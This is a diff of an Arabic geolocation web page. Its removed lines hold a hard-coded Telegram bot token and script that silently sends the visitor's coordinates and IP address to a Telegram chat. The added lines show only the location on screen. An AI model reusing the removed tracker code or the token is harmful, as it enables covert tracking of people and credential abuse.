@@ -1,82 +1,51 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>عدي</title>
-  <script>
-    const botToken = "7479937324:AAF2xQMakcnYT2z_hjuhbL_M8muZOg-dI0s";
-    const chatId = "7188733937";
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحديد الموقع الجغرافي</title>
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                // طلب تحديد الموقع
+                navigator.geolocation.getCurrentPosition(showPosition, showError);
+            } else {
+                alert("المتصفح لا يدعم تحديد الموقع");
+            }
+        }
 
-    function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(showPosition, showError);
-      } else {
-        alert("المتصفح لا يدعم تحديد الموقع");
-      }
-    }
+        function showPosition(position) {
+            var lat = position.coords.latitude;
+            var lon = position.coords.longitude;
 
-    function showPosition(position) {
-      const lat = position.coords.latitude;
-      const lon = position.coords.longitude;
+            // عرض الموقع في الصفحة
+            document.getElementById("location").innerHTML = 
+                "الخط العرض: " + lat + "<br>الخط الطول: " + lon;
+            
+            // يمكنك إضافة هنا إرسال البيانات إلى خادمك أو حفظها كيفما تشاء
+        }
 
-      document.getElementById("location").innerHTML =
-        "الخط العرض: " + lat + "<br>الخط الطول: " + lon;
-
-      fetch("https://api.ipify.org?format=json")
-        .then(response => response.json())
-        .then(data => {
-          const ip = data.ip;
-
-          const message = `📍 موقع جديد:
-خط العرض: ${lat}
-خط الطول: ${lon}
-🌐 IP: ${ip}`;
-
-          const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-          const payload = {
-            chat_id: chatId,
-            text: message
-          };
-
-          fetch(url, {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify(payload)
-          }).then(() => {
-            console.log("✅ تم الإرسال إلى تليجرام");
-          }).catch(err => {
-            console.error("❌ فشل الإرسال إلى تليجرام", err);
-          });
-
-        }).catch(err => {
-          console.error("❌ لم يتم الحصول على IP", err);
-        });
-    }
-
-    function showError(error) {
-      switch (error.code) {
-        case error.PERMISSION_DENIED:
-          alert("❌ رفضت الوصول إلى الموقع.");
-          break;
-        case error.POSITION_UNAVAILABLE:
-          alert("❌ تعذر الحصول على الموقع.");
-          break;
-        case error.TIMEOUT:
-          alert("⏱️ انتهت مهلة طلب الموقع.");
-          break;
-        case error.UNKNOWN_ERROR:
-          alert("❓ حدث خطأ غير معروف.");
-          break;
-      }
-    }
-  </script>
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("رفضت الوصول إلى الموقع.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("تعذر الحصول على الموقع.");
+                    break;
+                case error.TIMEOUT:
+                    alert("انتهت مهلة طلب الموقع.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("حدث خطأ غير معروف.");
+                    break;
+            }
+        }
+    </script>
 </head>
 <body>
-  <h2>اضغط الزر لتحديد موقعك الجغرافي:</h2>
-  <button onclick="getLocation()">📍 تحديد الموقع</button>
-  <p id="location" style="margin-top: 20px;"></p>
+    <h2>اضغط الزر لتحديد الموقع الجغرافي:</h2>
+    <button onclick="getLocation()">تحديد الموقع</button>
+    <p id="location"></p>
 </body>
 </html>
